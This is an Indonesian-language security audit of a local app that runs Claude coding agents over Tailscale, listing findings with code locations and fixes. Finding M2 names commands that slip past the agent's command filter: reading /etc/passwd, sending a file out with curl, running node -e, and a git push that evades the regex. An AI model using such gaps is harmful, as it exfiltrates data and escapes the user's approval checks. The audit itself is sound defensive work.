# cyber-fase1: tinjauan keamanan Fase 1 (read-only)

Verdict: PASS (tidak ada critical/high). Tidak ada temuan medium yang wajib jadi item urgent selain M1 dan M2 (disarankan).

## Medium
- M1 | src/security.ts:61 isAllowedTailscaleUser | Daftar CREW_TAILSCALE_USERS hanya dicek bila Host berakhiran .ts.net. Bila CREW_HOST = IP Tailscale (jalur yang disarankan .env.example), anggota tailnet lain cukup memakai Host 100.x.y.z dan melewati daftar. | Cek daftar pengguna untuk semua Host non-loopback; tanpa header Tailscale-User-Login hanya terima bila peer loopback; atau hapus opsi CREW_HOST=IP Tailscale dan wajibkan tailscale serve.
- M2 | src/policy.ts:5,28-36 | A3 hanya mendeteksi path drive-letter dan "..": `cat /etc/passwd`, `curl -d @file https://x`, `node -e`, `git -C . push` (lolos regex `git\s+push`) dan symlink dalam proyek tidak ditahan. Sudah ditandai shortcut di kode. | Terima sebagai risiko A3 untuk laptop sendiri; catat di README. Tambah pola git dengan opsi sebelum subcommand dan path POSIX absolut bila dipakai di luar laptop sendiri.

## Low
- L1 | src/security.ts:79-84 | Dengan tailscale serve semua permintaan datang dari 127.0.0.1: batas laju 60/menit jadi satu ember global untuk semua pengguna tailnet, dan GET/SSE (/api/runs/:id/events, /api/folders) tidak dibatasi (koneksi SSE tanpa batas). | Kunci laju pada header Tailscale-User-Login bila peer loopback; batasi jumlah SSE per klien.
- L2 | src/server.ts:279 | /hook/:token lolos cek isLoopback juga untuk lalu lintas tailscale serve. Dilindungi token acak 128 bit per run (index.ts:74); token juga ada di argv proses claude. | Tolak /hook/ bila ada header Tailscale-User-Login atau Host bukan 127.0.0.1.
- L3 | src/security.ts:34 | Host apa pun berakhiran .ts.net diterima (bukan hanya tailnet sendiri); risiko rebinding rendah karena peer tetap dicek. | Opsional: isi CREW_ALLOWED_HOSTS dengan nama tepat dan hapus wildcard.
- L4 | src/server.ts:172 | replaceAll dengan string pengganti: prompt berisi `$&`/`$'` terinterpolasi. Hanya merusak prompt sendiri. | Pakai fungsi pengganti `() => body.prompt`.
- L5 | .claude/agent-log.txt | Berkas log hook tidak di-ignore (hanya .claude/hooks dan settings.json yang diizinkan, ini untracked). Isi saat ini aman (nama agent, waktu). | Tambah ke .gitignore.

## Hasil per area (aman)
- Folder kerja: resolveProject memakai realpath + isInside; browse menyembunyikan symlink keluar; createFolder validasi nama Windows. Tes ada.
- Hanya 127.0.0.1: main.ts menolak 0.0.0.0 dan ::; peer, Host, Sec-Fetch-Site, Origin, Content-Type JSON dicek di onRequest.
- Izin/Selalu setujui: kategori berisiko tidak bisa disimpan (rule_not_allowed), aturan dihitung ulang dari input asli di server, rantai/pipa ditolak pada aturan awalan shell, aturan dapat dicabut.
- Penyajian teks agent: tidak ada dangerouslySetInnerHTML/innerHTML/eval di web/src; CSP (default-src 'self', object-src none, frame-ancestors self) dipasang untuk text/html; nosniff, no-store.
- Proses: spawn shell:false, cwd = proyek tervalidasi, galat 500 tanpa detail ke klien, bodyLimit 64 KB.
- Rahasia: .env, data/ di-ignore; .env.example tanpa nilai; token login Claude tidak disentuh; npm audit --omit=dev: 0 vulnerabilities.
- Panduan tailscale serve: ADA di README.md bagian 4 (serve ke 127.0.0.1:4780, CREW_TAILSCALE_USERS, larangan funnel, tailscale serve reset). Perlu tambah catatan M1 bila CREW_HOST=IP Tailscale dipakai.

Bagian checklist dipakai: Input dan DB, API, Secrets dan config, Deployment. Dilewati: Auth/sessions (tanpa login sendiri, akses lewat Tailscale), File uploads (tidak ada), Payments, External calls/SSRF (Web Push Fase 2).
